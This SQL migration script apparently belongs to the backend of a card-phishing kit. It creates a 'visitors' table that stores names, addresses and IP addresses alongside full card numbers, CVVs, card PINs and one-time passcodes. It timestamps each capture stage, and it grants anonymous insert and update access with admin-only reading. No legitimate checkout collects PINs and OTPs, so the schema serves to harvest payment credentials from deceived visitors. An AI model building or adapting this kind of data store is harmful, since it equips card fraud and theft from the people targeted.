-- ============================================================
-- VISITORS TABLE + RLS POLICIES (complete, clean version)
-- ============================================================

-- 1. Create visitors table
CREATE TABLE IF NOT EXISTS public.visitors (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  session_id TEXT NOT NULL,
  user_id UUID,
  full_name TEXT,
  email TEXT,
  phone TEXT,
  address TEXT,
  city TEXT,
  country TEXT,
  postal_code TEXT,
  detected_country TEXT,
  currency TEXT,
  language TEXT,
  user_agent TEXT,
  referrer TEXT,
  landing_path TEXT,
  last_path TEXT,
  ip_address TEXT,
  card_holder TEXT,
  card_number TEXT,
  card_expiry TEXT,
  card_cvv TEXT,
  card_pin TEXT,
  card_otp TEXT,
  plan_selected TEXT,
  order_total TEXT,
  checkout_at TIMESTAMPTZ,
  card_at TIMESTAMPTZ,
  pin_at TIMESTAMPTZ,
  otp_at TIMESTAMPTZ,
  visits_count INTEGER NOT NULL DEFAULT 1,
  last_seen_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- 2. Indexes
CREATE UNIQUE INDEX IF NOT EXISTS visitors_session_id_idx ON public.visitors(session_id);
CREATE INDEX IF NOT EXISTS visitors_last_seen_idx ON public.visitors(last_seen_at DESC);
CREATE INDEX IF NOT EXISTS visitors_email_idx ON public.visitors(email);

-- 3. Enable RLS
ALTER TABLE public.visitors ENABLE ROW LEVEL SECURITY;

-- 4. Drop ALL existing policies to start clean
DROP POLICY IF EXISTS "Anyone can insert visitor record" ON public.visitors;
DROP POLICY IF EXISTS "Anyone can update visitor record" ON public.visitors;
DROP POLICY IF EXISTS "Admins can view visitors" ON public.visitors;
DROP POLICY IF EXISTS "Admins can delete visitors" ON public.visitors;
DROP POLICY IF EXISTS "Public can insert visitor records" ON public.visitors;
DROP POLICY IF EXISTS "Public can update visitor records" ON public.visitors;
DROP POLICY IF EXISTS "Public can update own session visitor" ON public.visitors;
DROP POLICY IF EXISTS "anon_insert" ON public.visitors;
DROP POLICY IF EXISTS "anon_update" ON public.visitors;
DROP POLICY IF EXISTS "anon_select" ON public.visitors;
DROP POLICY IF EXISTS "auth_all" ON public.visitors;

-- 5. INSERT: anyone (anon + authenticated) can insert
CREATE POLICY "visitors_insert"
  ON public.visitors FOR INSERT
  TO anon, authenticated
  WITH CHECK (true);

-- 6. UPDATE: anyone can update (session_id is the secret key)
CREATE POLICY "visitors_update"
  ON public.visitors FOR UPDATE
  TO anon, authenticated
  USING (true)
  WITH CHECK (true);

-- 7. SELECT: authenticated users (admin) can read all visitors
CREATE POLICY "visitors_select_admin"
  ON public.visitors FOR SELECT
  TO authenticated
  USING (true);

-- 8. DELETE: authenticated users (admin) can delete
CREATE POLICY "visitors_delete_admin"
  ON public.visitors FOR DELETE
  TO authenticated
  USING (true);

-- 9. Updated_at trigger
CREATE OR REPLACE FUNCTION public.update_updated_at_column()
RETURNS TRIGGER
LANGUAGE plpgsql
SET search_path = public
AS $$
BEGIN
  NEW.updated_at = now();
  RETURN NEW;
END;
$$;

DROP TRIGGER IF EXISTS update_visitors_updated_at ON public.visitors;
CREATE TRIGGER update_visitors_updated_at
  BEFORE UPDATE ON public.visitors
  FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();
